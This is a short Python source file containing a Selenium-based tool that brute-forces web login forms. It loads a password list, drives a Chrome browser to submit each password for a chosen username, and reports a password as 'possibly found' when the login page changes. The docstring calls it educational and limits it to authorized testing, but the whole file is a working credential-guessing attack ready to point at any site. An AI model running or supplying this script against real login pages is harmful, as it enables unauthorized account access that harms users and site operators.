import selenium
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager

def run_bruteforce(username, username_selector, password_selector, login_btn_selector, pass_list, website):
    """
    Educational tool to demonstrate password brute-forcing on a login form.
    Use responsibly and only on systems you are authorized to test.
    """
    try:
        with open(pass_list, 'r') as f:
            passwords = f.readlines()
    except Exception as e:
        print(f"Error reading password list: {e}")
        return "Password list error."

    options = webdriver.ChromeOptions()
    options.add_argument("--disable-popup-blocking")
    options.add_argument("--disable-extensions")
    browser = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()), options=options)
    wait = WebDriverWait(browser, 10)
    try:
        for password in passwords:
            password = password.strip()
            if not password:
                continue
            try:
                browser.get(website)
                wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, login_btn_selector)))
                sel_user = browser.find_element(By.CSS_SELECTOR, username_selector)
                sel_pas = browser.find_element(By.CSS_SELECTOR, password_selector)
                enter = browser.find_element(By.CSS_SELECTOR, login_btn_selector)
                sel_user.clear()
                sel_user.send_keys(username)
                sel_pas.clear()
                sel_pas.send_keys(password)
                enter.click()
                print(f'Tried password: "{password}" for user: "{username}"')
            except selenium.common.exceptions.NoSuchElementException:
                print('Element not found. Possible password found or page structure changed.')
                print(f'--> Possible password found: {password}')
                return password
            except selenium.common.exceptions.TimeoutException:
                print("Page timed out. Check selectors or website status.")
                break
    finally:
        print("Closing browser.")
        browser.quit()
    return "Brute force complete."
